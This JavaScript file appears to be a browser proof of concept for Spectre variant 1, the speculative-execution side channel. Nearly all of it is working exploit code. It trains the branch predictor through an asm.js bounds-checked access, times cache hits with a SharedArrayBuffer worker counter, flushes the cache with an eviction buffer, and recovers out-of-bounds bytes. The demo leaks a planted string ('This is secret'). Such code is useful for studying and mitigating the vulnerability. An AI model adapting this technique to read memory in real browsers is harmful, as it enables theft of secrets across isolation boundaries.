function log(msg)
{
    var p = document.getElementById("progress");
    if (p)
    {
        p.innerText += msg + "\n";
    }
    else
    {
        console.log(msg);
    }
}

function asmModule(stdlib,forgein,heap)
{
	var simpleByteArray = [];
    var simpleByteArray = new stdlib.Uint8Array(heap);
    var probeTable = new stdlib.Uint8Array(heap);
    const TABLE1_BYTES = 0x2000000;
    const sizeArrayStart = 0x1000000;
    var junk = 0;

    function init()
    {
        var i =0;
        var j =0;
        
        for(i = 0; (i|0) < 33; i = (i+1)|0 )
        {
            j = (((i<<12)|0) + sizeArrayStart)|0;
            simpleByteArray[(j|0)] = 16; // simpleByteArrayLength
        }
    }

    function vul_call(index, sIndex)
    {
        index = index |0;
        sIndex = sIndex |0;
        var arr_size = 0;
        var j = 0;
        junk = probeTable[0]|0;
        j = (((sIndex << 12) | 0) +  sizeArrayStart)|0;
        arr_size = simpleByteArray[j|0]|0;
        if ((index|0) < (arr_size|0))
        {
            index = simpleByteArray[index|0]|0;
            index = (index << 12)|0;
            index = (index & ((TABLE1_BYTES-1)|0))|0;
            junk = (junk ^ (probeTable[index]|0))|0;
        }
    }

    return { vul_call: vul_call, init: init };
}

function check(data_array)
{
    function now() { return Atomics.load(sharedArray, 0) }
    function reset() { Atomics.store(sharedArray, 0, 0) }
	function start() { reset(); return now(); };
    function clflush(size, current)
    {
        var offset = 64;
        for (var i = 0; i < ((size) / offset); i++)
        {
            current = evictionView.getUint32(i * offset);
        }
    }

    // start thread counter
//    const worker = new Worker('timer.js');
    const worker = new Worker(URL.createObjectURL(new Blob(["(" + worker_function.toString() + ")()"], {type: 'text/javascript'})));
    const sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT);
    const sharedArray = new Uint32Array(sharedBuffer);
    worker.postMessage(sharedBuffer);

    var simpleByteArrayLength =  16;
    const TABLE1_BYTES = 0x3000000;
    const CACHE_HIT_THRESHOLD = 0;
    var probeTable = new Uint8Array(TABLE1_BYTES);

    var cache_size = CACHE_SIZE * 1024 * 1024;
    var evictionBuffer = new ArrayBuffer(cache_size);
    var evictionView = new DataView(evictionBuffer);

    clflush(cache_size); 

    var asm = asmModule(this, {}, probeTable.buffer)

    worker.onmessage = function(msg)
    {
        function readMemoryByte(malicious_x)
        {
            var results = new Uint32Array(257);
            var simpleByteArray = new Uint8Array(probeTable.buffer);
            var tries =0
            var junk = 0;
            for (tries = 0; tries < 99; tries++)
            {
                var training_x = tries % simpleByteArrayLength;
                clflush(cache_size);          
				// compile and cache functions?
                var time3 = start();
                junk = simpleByteArray[0];
                var time4 = now();
                junk ^= time4 - time3;
				
                // train branch predictor? (every 4 good indexes uses one malicious, repeat 8 times)
                for (var j = 1; j < 33; j++)
                {
					for (var z = 0; z < 1000; z++) {} // delay
					
					// if (j % 4) training_x else malicious_x
                    var x = ((j % 4) - 1) & ~0xFFFF;
                    x = (x | (x >> 16));
                    x = training_x ^ (x & (malicious_x ^ training_x));
                    asm.vul_call(x, j); // x = index to read, j = iteration for fresh size value
                }

                // measure time of all possible offsets
                for (var i = 0; i < 256; i++)
                {
					mix_i = ((i * 167) + 13) & 255;
                  
					var timeS = start();
                    junk =  probeTable[(mix_i << 12)];
                    timeE = now();
				
                    if ((timeE-timeS) <= CACHE_HIT_THRESHOLD) {
                        results[mix_i]++;
                    }
                }
            }

            // select majority vote
			
            var max = -1;
			var snd = -1;
            for (var i = 0; i < 256; i++)
            {
				if(max > results[i]){
				
					snd = (snd > results[i]) ? snd : i;
				}
				else{
					snd = max;
					max = i;
				}
            }
            results[256] ^= junk; 
            return {max: max, snd: snd};
        }

        asm.init();

        // set data to read "out-of-bounds"
        const BOUNDARY = 0x2700000;
        var simpleByteArray = new Uint8Array(probeTable.buffer);
        for (var i = 0; i < data_array.length; i++)
        {
            simpleByteArray[BOUNDARY + i] = data_array[i];
        }
		
		
        // leak data
        log("start");
        for (var i = 0; i < data_array.length; i++)
        {
            var data = readMemoryByte(BOUNDARY+i);
            worker.terminate();
            log("leak off=0x" + (BOUNDARY+i).toString(16) +
                ", byte=0x" + data.max.toString(16) + " '" + String.fromCharCode(data.max) + "' second: " + String.fromCharCode(data.snd) + "'" +
                ((data.max != data_array[i]) ? ((data.snd != data_array[i]) ? " (error)" : "(second)") : ""));
        }
        worker.terminate();
        log("end of leak");
        return;
    }
}

const CACHE_SIZE = 12;

function main()
{
    console.log("main::start");
    if(window.SharedArrayBuffer)
    {
        log("eviction buffer sz: " + CACHE_SIZE + "MB");
		var secret = "This is secret";
		var asciiKeys = [];
		for (var i = 0; i < secret.length; i ++)
			asciiKeys.push(secret[i].charCodeAt(0));
        check(asciiKeys);
    }
    else
    {
        log("No SharedArrayBuffer available");
    }
}
